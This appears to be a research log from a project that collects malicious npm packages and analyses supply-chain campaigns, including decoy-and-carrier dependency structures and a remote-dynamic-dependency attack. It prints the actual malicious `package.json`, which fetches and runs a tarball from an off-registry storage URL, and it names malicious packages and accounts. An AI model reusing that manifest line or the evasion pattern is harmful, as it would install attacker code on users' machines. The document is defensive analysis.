| rescued by a *later* publication of the same name | 5,746 (45.5%) |
| **never analysed at all** | **6,892 (54.5%)** |
| of those, later removed by npm | **6** |

Counting every retryable failure, not just 404, the population is **7,354**.

The six are not noise: they include `depcruise-wrap-stream-in-html` and
`eslint-generate-prerelease`, which share the operator and the lexical domain of
`depcruise-fmt`, `depcruise-baseline` and `eslint-generate-release` — three
packages already in the corpus, published by `whltd4`.

**The window was never tight.** `shared-slot-gate` 404ed at 09:30:10 on
2026-08-13 and npm did not remove it until 16:19 — nearly seven hours in which
one more request would have got it. `async-lock-queue` is the same story at
11:45. Both are members of the lock family.

Fixed with a bounded on-disk queue and four attempts at 30s / 5min / 30min / 2h.
The schedule spans **two and a half hours on purpose**: npm's median time to
remediation is 64 minutes, so a schedule that gave up inside an hour would
systematically drop the packages most worth having. What is still missing at the
end is written to `lost-publications.ndjson` with its reason — a silent drop is
indistinguishable from a registry that had nothing, and that is how this went
unnoticed for weeks.

`norte-guard backfill-404` is the one-time pass over what the defect already
cost. It replays each name through the **same** `analyzePackage` the watcher
uses, so a recovered package is judged by the policy that would have judged it at
the time. Capturing them unconditionally would put 7,354 packages selected by
"npm was briefly inconsistent about them" into a corpus whose every other member
was selected by score or by class, and nothing downstream could separate the two
draws.

## D16 — the quarantine conjunction is calibrated for the decoy, not the carrier

The most consequential finding of this pass, and it came out of asking why one
package was dropped.

On 2026-08-13 `javonayers999` published five packages in four minutes:

```
09:26:47  async-critical-section@1.0.0   3084B  repo=false  deps=mutex-forge
09:27:15  keyed-mutex-map@2.1.2          4010B  repo=false  deps=mutex-forge
09:29:08  resource-lease-pool@1.4.2      3825B  repo=false  deps=mutex-forge
09:30:43  single-flight-lock@1.0.0       3578B  repo=false  deps=mutex-forge
09:31:01  try-lock-runner@3.2.1          3517B  repo=false  deps=mutex-forge
```

All five are the observed class exactly — young, tiny, no repository — and all
five were captured. **All five declare one dependency, and it is the same one.**

`mutex-forge` was analysed twice while it was still live, at 03:52 and 07:58,
scored **10**, and was rejected: 664KB (fails `tiny`) with a repository field
(fails `!hasRepository`). It satisfies only one of the three conjuncts, so
widening the class to two-of-three would not have kept it either.

The five in the corpus are the decoys. The one thing all five point at is the one
thing the filter is built to ignore, and that is not a coincidence: the class
describes what a *throwaway* package looks like, so a package designed to be
depended upon has to look like a library instead.

The rule that follows is small and reuses a frozen bound rather than inventing
one: **if a captured package declares a dependency, and that dependency is itself
under `YOUNG_NAME_DAYS`, capture it — without consulting its size, its
repository, its install script or its score.** `mutex-forge` was young; the feed
row records `young=true, tiny=false, repo=true`.

Cost, measured before building it: the median capture declares **1** dependency
(mean 3.7, 39% declare none), the median declared dependency is **1,455 days
old**, and **1.8%** are under seven. Over the whole corpus the rule reaches for
about **163** packages rather than the 9,330 distinct names that are declared.
Fan-out is capped at 12 per capture — the maximum in the corpus is 519 — and the
truncation is logged rather than silent. Depth is one: a captured dependency does
not follow its own, because the argument for capturing it is that something
already judged interesting pointed at it, and that does not survive a second hop.

Captures on this path carry `captureReason: 'declared-dependency'` so the
population can be counted apart from both the score path and quarantine. It is a
different draw and must not silently join either denominator.

## Corrections to the previous pass

Three claims in the prior section were wrong and are corrected here rather than
edited away.

**"380 takedowns seen in the feed, 270 dropped by the capture policy."** The 380
is the set of names for which npm published a `0.0.1-security` placeholder during
the window — not 380 attacks this collector watched happen. Sampling 80 of the
270 and reading their packuments from the registry:

| | |
|---|---|
| last real version published **before** the log window opens | 65 (81.3%) |
| **still have real versions today** — never actually removed | 13 (16.3%) |
| genuinely catchable: published in-window, then removed | **5 (6.3%)** |

Extrapolated, roughly **16** of the 270, not 270. The capture policy rejected at
most ~11 of them, and of the five catchable ones, three (`async-lock-queue`,
`mutex-forge`, `shared-slot-gate`) are further members of the lock family.

**"The watcher had 30.2% downtime and that is where the corpus went."** Also
wrong. The cursor resumes from `.last_seq` and backfills: across 1,595,919
sequence numbers there is **not one gap greater than 500**. The hours with no
rows are hours the process was down, and everything published during them was
enumerated afterwards, in order, with nothing lost. The measurement was of
wall-clock write times, not of coverage.

**"The score path is systematically filtering the class."** It is not the
mechanism. Quarantine captures an in-class package *regardless of score* —
`effectiveScore < threshold` is the condition that activates it — and 92% of the
captured takedowns were in-class. The score path only decides for packages
outside the class, which is precisely where `mutex-forge` was lost, and by the
class conjuncts rather than by the threshold.

**On widening the class to two-of-three**, costed and withdrawn: it is 30,039
publications, **15.54% of the stream**, not 270. With tarballs that is **298
GB/month** against a 2.00 GB budget, and 99% of the cost is the subset that fails
`tiny` — the platform binaries, at 13.5 MB mean. It would also not have kept
`mutex-forge`, which fails two conjuncts.

## D17 — the publisher unit assumes accounts are independent, and one case violates it

A5 made `publisher` its primary unit on reasoning that is right as far as it
goes: a capture is not an independent event because one operator republishes 149
times, and a package is not one because one operator publishes five names in four
minutes. The account looked like the level at which members are separate
decisions.

The corpus contains a counter-example. `ferrousdev`, `wokorc` and `corssdev`
share the identical 9-key `package.json` field order — `name, version,
description, main, scripts, keywords, author, license, files` — which over
10,192 distinct package names reduces to 7,505 signatures, of which this one is
used by **exactly these three accounts and no others**. They also run the same
two-tier structure four times inside 28.6 hours:

| primitive, no dependencies | importer | account | published |
|---|---|---|---|
| `bcs-core` | `sui-gql-core` | ferrousdev | 2026-08-17 10:52 |
| `leb128x` | `sui-move-rpc` | ferrousdev | 2026-08-17 13:35 |
| `ulebkit` | `sui-move-graphql` | wokorc | 2026-08-17 17:05 |
| — | `sui-move-gql` | corssdev | 2026-08-18 15:30 |

A5 counted ferrousdev and wokorc as **two of its eight independent events**. Every
interval it printed at the publisher unit is therefore narrower than the truth by
a degree of freedom, in the same direction as the capture unit's error and for
the same reason: a unit whose members are not independent.

**Fixed by adding the unit rather than by editing the old one.** `operator` is
the publisher unit with declared links collapsed, and it is now `PRIMARY_UNIT`.
`publisher` stays in `UNITS` and in the printed output, because every run before
2026-08-21 reported it and a reader comparing against those needs the same
number, not a silently improved one. An account with no declared link is its own
operator, so the operator unit can never be coarser than the publisher unit by
accident.

The case arm now reads **7 operators (9 npm accounts)**.

`operator.ts` is a declared table, **not a detector**. Nothing infers a link at
runtime: a similarity judgement over a corpus this size finds pairs by chance,
and a wrong merge removes a degree of freedom the analysis cannot get back. Each
entry carries the evidence, the run prints it beside the caveat, and a test
requires every link to have more than one account, at least one evidence kind,
and a stated reason.

### `sui-move-gql`, labelled from the operator and not from npm

`corssdev`'s `sui-move-gql@1.0.1` and `@1.0.2` were `unconfirmed`. npm never
removed them and no advisory names them, so the takedown record cannot promote
them and neither can a score.

They are now `confirmed_malicious` with `labelSource:
operator-link:corssdev=ferrousdev=wokorc (content signature + two-tier dependency
pattern)` — a source of its own, deliberately not `npm-takedown`. Six packages
from the other two accounts are confirmed by takedown; this one is confirmed by
belonging to the same operator, and anything downstream that wants to weigh the
two kinds differently can tell them apart by the field.

This is the first label in the corpus that rests on an inferred operator rather
than on an external record about the artifact. It is worth flagging as such: if
the link is wrong, this label is wrong, and the evidence for the link is printed
in the run rather than buried here.

## The signature axis is a screen, not a detector

Recorded at the strength it actually has.

Grouping the corpus by `package.json` field order reduces **10,192 distinct
package names to 40 groups of three or more accounts — 0.53% of 7,505
signatures, a 250× reduction**. That is a useful first cut over a corpus nobody
can read by hand.

It is not a detector, for three reasons, and all three are measured rather than
argued:

1. **Most of what it finds is toolchains.** Of the 40 groups, the largest are
   `create-react-native-library` (11 accounts, 26-key template),
   `@napi-rs/cli` platform binaries (`name, version, description, license, os,
   cpu, files` and variants, several groups), and `n8n-nodes-*` scaffolding. A
   monorepo is a process too; its process is public and leaves a consistent
   trace.
2. **Precision is unmeasured.** 38 of the 40 groups are entirely `unconfirmed`,
   which `corpus.ts` is explicit is not the same as benign. Two groups contain a
   confirmed name. Nothing here supports a precision figure in either direction.
3. **The obvious knob makes it worse.** A minimum key count was tried first, on
   the reasoning that a short `package.json` collides with everything — and the
   collision rate does fall from 100% at 3 keys to 0.7% at 12. But the campaign
   packages have a **median of 6 keys**, and only 2 of 40 reach a 12-key floor.
   The floor excludes exactly what it is meant to find. What discriminates is the
   **order**, not the length: `name, version, description, keywords, license,
   main` in that sequence is used by the three `-th` accounts and by no other
   publisher in the corpus.

Used as a screen it did produce one thing no other pass found: the
ferrousdev/wokorc/corssdev link above, which is now D17. That is the shape to
expect from it — a short list worth reading, not a verdict.

### The same-scope sibling: degraded, not excluded

The dependency rule fired 219 times during the 404 backfill, against an estimate
of ~163 for the whole corpus. The estimate was wrong in a way worth recording:
it sampled the **general** dependency population, where the median name is 1,455
days old and 1.8% are young. The actual population is *dependencies of captures*,
and captures are young packages — which depend on young packages. It is the same
enrichment measured at depth 2 (25.4% young against a 1.8% base rate), arriving
one hop earlier than expected.

Broken down, **203 of the 219 (92.7%) are same-scope siblings** — a package
declaring another under its own npm scope, which is what a monorepo release looks
like from inside this rule.

Every carrier the rule was written for is cross-scope: `async-critical-section` →
`mutex-forge`, `sui-gql-core` → `bcs-core`, `sui-move-rpc` → `leb128x`,
`sui-move-graphql` → `ulebkit`.

So the sibling is **degraded rather than excluded**, on the pattern the 8MB cap
already set: the packument is captured, the tarball declined, and
`tarballRefused: 'same-scope-sibling'` recorded. Excluding them would take the
population out of the denominator as well, and the question *"does an operator
ever use one scope for both the decoy and the carrier"* would stop being
answerable. It is not a question this corpus can answer today, which is exactly
why the population has to stay in it.

`TarballRefusal` became a discriminated union to carry the difference: a size
refusal needs the cap it was measured against, a scope refusal needs the package
that declared it.

The disk saving is real in proportion and negligible in absolute terms — 0.66 MB
of the path's 0.74 MB — and is recorded that way rather than as a headline. What
the change buys now is a consistent rule; what it buys later is the same 88.7% at
a volume where it matters.

### Depth 2, declined

Costed at ~412 extra packument requests for ~49 extra captures, and not built.
The 25.4% young rate at depth 2 against 1.8% at depth 1 is not evidence of more
malware; it is that new packages depend on new packages, so depth 2 pulls in
monorepo siblings in bulk. The argument for capturing a dependency is that
something already judged interesting points at it, and that argument does not
survive a second hop.

## C1 — the destinations, and the carrier npm never hosted

> **Correction, 2026-08-21.** This section was written as though the mechanism it
> describes were an observation of this project's. It is not. The technique is
> **PhantomRaven**, published by Koi Security in October 2025 as *Remote Dynamic
> Dependencies*; Socket ships a detection rule for the shape; and all eight
> packages already carried OSV/GHSA advisories, the `gunzip-js` one published
> about an hour after this collector captured it and already naming the bucket,
> the `depenconf` path, the version squat and the empty index.
>
> Nothing below is withdrawn — the measurements are correct — but every sentence
> that reads as discovery should be read as **independent re-observation of
> published work**. See [prior-art.md](prior-art.md) for the citations and for the
> classification of every other piece in this audit.


Reachability saturates because "can this package reach the network" is answered
`reached` by most of npm and `indeterminate` by the rest. Destinations do not:
stolen credentials are worthless where they are, and leaving means a host.

The extraction is deliberately **not a parse**. Across the 58 case tarballs there
are 10,758 files: 4,882 data, 2,459 docs, 1,594 foreign-script, 1,458 asset, 180
javascript. **The JavaScript analysis reaches 1.7% of them.** Strings reach all of
them — the AWS metadata endpoint and the name of a dynamic-import shim both
survive intact inside `@siwatfa/yorn`'s 15MB V8 bytecode cache, where no parser
goes.

### The finding

Eight packages published by `whltd4`, every one at version **99.9.1**, declare a
dependency that is not on npm:

```json
"dependencies": { "ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.4.tgz" }
```

with a different `ltidisafe` version per package — 3.6.1, 3.6.3, 3.6.5, 3.6.6,
3.6.7, 3.7.2, 3.7.3, 3.7.4. `npm install` fetches that tarball and runs it. The
registry never saw it, never scanned it, and **cannot take it down** — the eight
npm packages were removed and the bucket is untouched by that.

It is the `mutex-forge` structure one step further out: the carrier is not a
package, it is a URL. The version `99.9.1` is a semver squat.

| unit | cases | controls | difference |
|---|---|---|---|
| capture | 3/58 (5.17%) | 3/3,000 (0.10%) | +5.1pp, CI +1.7 to +14.0 |
| **operator** | **1/7 (14.29%)** | 3/1,207 (0.25%) | **+14.0pp, CI +2.3 to +51.1** |

Over the packument cohort, which needs no tarball, it is 8/89 captures against
64/25,305 — a 36× enrichment at the capture unit.

**It separates at the primary unit, and it is not a finding.** Two reasons, both
disqualifying on their own: the endpoint was written **after reading the case
tarballs**, which is the definition of fitted-to-the-sample that the post-hoc
`credential_read` block exists to flag; and it rests on **one independent
operator**. It is a hypothesis this pass generated. The next confirmed sample is
the test of it.

The bucket was deliberately **not probed**. A HEAD costs nothing and tells the
operator someone is looking, and the whole thesis of this project is that the
evidence disappears — 0 of 42 external removals kept a tarball. The URL is
recorded; the sample stays where it is.

### It also found a hole in the rule built two passes ago

`declaredDependencies` read `Object.keys(meta.dependencies)`. For this manifest
the key is `ltidisafe` — a name npm has never heard of — while the specifier is
what actually gets fetched. The dependency rule written to follow the carrier
would have asked npm about a package that does not exist, taken a 404, and then
spent the entire retry schedule on it.

Fixed: `declaredDependencies` now returns only registry-resolvable names, and
off-registry specifiers come back separately from `offRegistryDependencies` and
are logged by name. They are the more interesting half — a carrier npm never
hosted cannot be captured from npm at all, and nothing downstream would otherwise
record that the package had one.

## C2 — no two case operators share a destination

The hypothesis was that two accounts counted as separate operators would turn out
to exfiltrate to one place, and the case arm would shrink again.

**It does not.** Over 58 case and 3,000 control captures, every host reached by
more than one operator is ordinary and on the control side: `img.shields.io` (269
operators), `en.wikipedia.org` (89), `localhost:3000` (71), `api.openai.com`
(69), `stackoverflow.com` (67), `cdn.jsdelivr.net` (65). No case operator shares
a destination with any other.

`ltidi.storage.googleapis.com` belongs to exactly one operator. `graphql.mainnet.sui.io`
appears in 3 case packages and 1 control, and is the public Sui API.

**The case arm stays at 7 operators.** Recorded because a negative on this
question is worth as much as a positive: it is the difference between "we have
seven events" and "we may have fewer than we think", and that had no answer
before.

### A counting error found in the process

The first version of this comparison counted host mentions per **capture**. 36 of
the 58 case captures are `@siwatfa/yorn`, so ten hosts appeared as "36 case
packages agreeing with each other" when they are one package's release loop —
the capture-unit error this project has now made in four separate places. Counting
distinct package names, only one host repeats across case packages at all:
`ltidi.storage.googleapis.com`, in 3, against 0 controls.

## The `ltidi` mechanism — structural, and it does not need n

Recorded as a mechanism rather than as a signal. The statistical separation
reported above is **disqualified** — the endpoint was written after reading the
case tarballs, and it rests on one operator — and none of that touches what
follows, because what follows is not an inference from a rate. It is a
demonstration.

### What the package is

`gunzip-js@99.9.1`, 352 bytes unpacked, two files:

```js
// package/index.js — 35 bytes, the entire code
'use strict';
module.exports = {};
```

```json
// package/package.json — 317 bytes
{
  "name": "gunzip-js", "version": "99.9.1", "main": "index.js",
  "scripts": { "test": "echo \"Error: no test specified\" && exit 1" },
  "dependencies": { "ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.2.tgz" },
  "license": "ISC"
}
```

**The package contains no code and it is not hiding that.** It exports an empty
object. There is no install script. Every content-based question this project
asks — what does it reach, what can it do, how much of it can be read, how opaque
is it — returns "this package does nothing", and every one of those answers is
correct.

The attack is one line of the manifest.

### The eight

All published by `whltd4`, all at version `99.9.1`, in two bursts:

| package | published | `ltidisafe` version |
|---|---|---|
| napi-raw | 2026-08-13 05:17:04 | 3.6.1 |
| eslint-generate-release | 2026-08-13 05:20:49 | 3.6.3 |
| check-audit | 2026-08-13 05:23:26 | 3.6.5 |
| resolve-audit | 2026-08-13 05:24:23 | 3.6.6 |
| cspell-esm | 2026-08-13 05:25:26 | 3.6.7 |
| gunzip-js | 2026-08-15 14:27:43 | 3.7.2 |
| depcruise-fmt | 2026-08-15 14:30:45 | 3.7.3 |
| depcruise-baseline | 2026-08-15 14:31:31 | 3.7.4 |

Five names in eight minutes, then three in four minutes two days later. A
distinct `ltidisafe` version per package, which is a build-and-publish loop
rather than eight hand-edited manifests.

`99.9.1` is a semver squat: a version above anything a real package of these
names would carry, so a range that resolves to "latest" resolves here.

### Why it is structural

**npm removed all eight packages. The bucket is untouched by that.** A registry
takedown reaches what the registry hosts, and the payload was never hosted by the
registry — `npm install` fetches it from Google Cloud Storage at install time.
The remediation and the payload are in different jurisdictions.

This is the `mutex-forge` structure one step further out. There, the carrier was
a package that failed the quarantine conjunction by looking like a library. Here
there is no carrier package at all, so there is nothing for a package-shaped
filter to be calibrated against.

### What it costs the rest of this work

Every endpoint A5 has measured is a property of a tarball. This attack puts
nothing in the tarball. A corpus assembled by capturing interesting-looking
*contents* will contain these eight only by accident — and it did: they were
captured because they matched the observed class (young, tiny, no repository),
not because anything read them.

The prospective form of the endpoint is in the next section, and unlike the
comparison above it was defined before the sweep that measured it.

## Off-registry dependencies across the whole corpus

Prospective: the endpoint was defined by C1, then applied to everything rather
than to the cases.

Over **25,394 captures / 13,344 distinct package names**, 42 names (0.315%)
declare a dependency that is not on the registry, and there are **five distinct
destinations in the entire corpus**:

| destination | names | operators | names per operator | label |
|---|---|---|---|---|
| `file:` | 16 | 15 | 1.07 | unconfirmed |
| `github:` | 11 | 10 | 1.10 | unconfirmed |
| **`ltidi.storage.googleapis.com`** | **8** | **1** | **8.00** | **confirmed_malicious** |
| `cdn.sheetjs.com` | 4 | 4 | 1.00 | unconfirmed |
| `github.com` | 3 | 3 | 1.00 | unconfirmed |

Every ordinary use is **one name per operator** — a developer pointing at
sheetjs, a monorepo `file:` link, a fork on GitHub. `ltidi` is the only
destination where one operator owns many names, at eight times the concentration
of anything else.

The *endpoint* was declared before this sweep; the *concentration ratio* is an
observation from it, and is flagged as such rather than presented as a
pre-registered test. What makes it worth keeping is that it is a shape rather
than a threshold: it needs no cut-off, and it is computed from the manifest, so
it applies to every publication whether or not a tarball survives.

## D — the sibling diff

### D2 passes its stopping criterion, on thin validation

The ranking was frozen before the run: **tier 1** a path only one sibling has,
**tier 2** a shared path with different bytes, **tier 3** a shared path with
identical bytes — the scaffolding. Largest first inside a tier, and nothing else
consulted.

Validated against the two captures whose payload location is known from other
work:

| group | known payload | established by | rank |
|---|---|---|---|
| `a_soclav` | `kit-hydration-vim/dist/internal/calc.dat` | the magic-byte example in `docs/benchmark.md` | **1 of 17 overall** |
| `whltd4` | `gunzip-js/package.json` | the off-registry dependency; the package has no other code | **1 of 2 in its package** |

Both pass. What that is worth:

- **`a_soclav` is a real pass.** `calc.dat` is tier 1 at 63,616 bytes and beat
  sixteen other candidates across both packages.
- **`whltd4` is close to a free one.** The package has two files, one of which is
  byte-identical across all three siblings. Ranking the manifest above a shared
  stub is not much of an achievement, and any rule would manage it.
- **n = 2**, and one of them is trivial. The hypothesis survives; it is not
  established.

**Where the rank comes from matters.** Inside a tier the order is size, so
`calc.dat` ranks first because it is thirty-five times larger than the next
unique file. A small payload would sit below a large unique README. That is a
limitation of the frozen rule and is left in place rather than patched, because
patching it after seeing which file won is how a rule stops being a test.

### The sui group inverts the framing

`bcs-core`, `leb128x` and `ulebkit` ship a **byte-identical 1,571-byte
`index.js`** under three different package names, while the three importers that
depend on them (`sui-gql-core`, `sui-move-gql`, `sui-move-graphql`) each have a
different one.

The rule ranks the importers' files above the primitives', because the primitives
agree with each other and agreement is what tier 3 is for. But three package
names shipping identical code is the diagnostic fact about that operator, and the
tiering treats it as the least anomalous thing in the group. `siblingsWithPath`
and `siblingsWithSameContent` are printed beside every candidate for exactly this
reason: the tier alone cannot tell "one of two differs" from "three of six
agree".

Not fixed. The rule was frozen before the run and a second criterion added after
seeing this group would be fitted to it.

### D1 fails, and the reason is more useful than the failure

Internal style uniformity — indentation, quoting, semicolons — over every
confirmed-malicious capture with two or more readable files:

| | |
|---|---|
| captures examined | 45 |
| with a style outlier | **4** (all `exam-kit`, the same five files) |
| **known payloads among the outliers** | **0** |

And it could not have found them. D1 reads JavaScript and typed source; **neither
known payload is either**. The payloads in this corpus are:

- a `.dat` file identified by magic bytes (`calc.dat`)
- one line of a manifest (`ltidisafe`)
- a 15MB V8 bytecode cache (`yorn.jsc`)
- byte-identical code republished under different names (the sui primitives)

None is a JavaScript file with unusual indentation. The premise — that the
payload was written by a different hand than the scaffolding and shows it in
style — assumes the payload is *source*, and in this corpus it usually is not.

Recorded as a negative with the code kept and a test that pins the reason, so the
next person to have the idea finds the measurement rather than the idea.

### What D says about B

B was already out on the grounds that reachability saturates. D adds a second
reason it would not have helped: for the `ltidi` packages there is no capability
to be coherent or incoherent with, because there is no code. `module.exports = {}`
declares nothing and does nothing, and both are true.

## The concentration base rate, measured before any threshold

The signal is not that a package declares an off-registry dependency — 42 names
do that and 41 of them are ordinary. It is that **one operator points many names
at one destination**.

Measured over 25,394 captures covering 13,344 distinct names, as
`(operator, destination)` pairs:

| distinct names in the pair | pairs |
|---|---|
| 1 | **30 (90.9%)** |
| 2 | 2 |
| 3 to 7 | **0** |
| **8** | **1** — `whltd4 → ltidi.storage.googleapis.com` |

**The region between 2 and 8 is empty.** Nothing in this corpus sits between an
ordinary use and the campaign.

### The window

The eight names span 3,434 minutes — 2.4 days — so a short window might have been
expected to miss it. It does not, because the publications came in bursts:

| rolling window | distribution of peak names per pair | pairs reaching 3 or more |
|---|---|---|
| 60 min | 1:31, 2:1, **5:1** | 1 (`whltd4`) |
| 6 h | 1:31, 2:1, **5:1** | 1 |
| 24 h | 1:31, 2:1, **5:1** | 1 |
| 72 h | 1:30, 2:2, **8:1** | 1 |

A **60-minute** window is enough: the 2026-08-13 burst put five names on the
bucket in eight minutes. No other pair exceeds two names at any window tested.

### Why this is measurable prospectively, and why it matters

Every input is in the packument. The watcher already fetches one per publication,
so a rolling map from `(operator, off-registry host)` to the names seen in the
last hour needs **no tarball, no parse, and no content analysis at all**. The
state is small: 33 pairs over nine days.

That is the point. This is the only endpoint in the whole audit that attacks the
class described in the README limit — a package with no code in it — because it
never looks at the code. Every other measurement in A5 reads a tarball, and these
eight packages put nothing in theirs.

### No threshold is proposed here

The base rate was measured first, as it should have been for `fabricatedProfile`
and was not. What it shows is a gap, not a cut-off, and three things stand
between that gap and a rule:

1. **The pool is this collector's capture filter**, not npm. Every rate above
   describes an enriched population.
2. **n = 1.** One malicious pair. A threshold anywhere in 3 to 5 separates this
   corpus perfectly and is fitted to a single event.
3. **`operator` is itself inferred.** The unit rests on the declared links in
   `operator.ts`, and a wrong link would merge or split a pair.

What would settle it is a second campaign. Until one arrives the measurement is
recorded and the rule is not written — which is the discipline D14 exists to
enforce, applied to this project's own idea rather than to someone else's.

## The prior-art rule

Added 2026-08-21, after C1 was written up as a finding and turned out to be a
re-observation of PhantomRaven — caught only because someone went looking for an
address to report it to.

**No piece of this work is documented as a finding until prior art has been
searched.** Academic (Backstabber's Knife Collection and what cites it; MSR,
USENIX, CCS on registry supply chain), industry (Socket, Aikido, Phylum, Koi,
Checkmarx, StepSecurity, Snyk, Sonatype, JFrog, ReversingLabs, Endor), advisory
databases (GHSA, OSV, npm advisories) and the tooling that already ships
(socket-cli, npq, lockfile-lint).

Each piece is classified `replication`, `extension`, or `not found` — never
`novel`, because a dozen web searches is not a literature review and absence of
evidence at that depth is weak. A replication is still worth having and gets said
as a replication.

The full classification of everything built here is in
[prior-art.md](prior-art.md). The short version: most of it is replication, the
largest genuinely-unduplicated part is the **negative** results, and the one
extension worth writing up is the base-rate distribution of
`(operator, off-registry destination)` pairs — which is an extension of a Socket
observation about shared exfiltration hosts, not a new idea.

This is the same discipline already applied to numbers, applied to claims:
nothing asserted without verification.
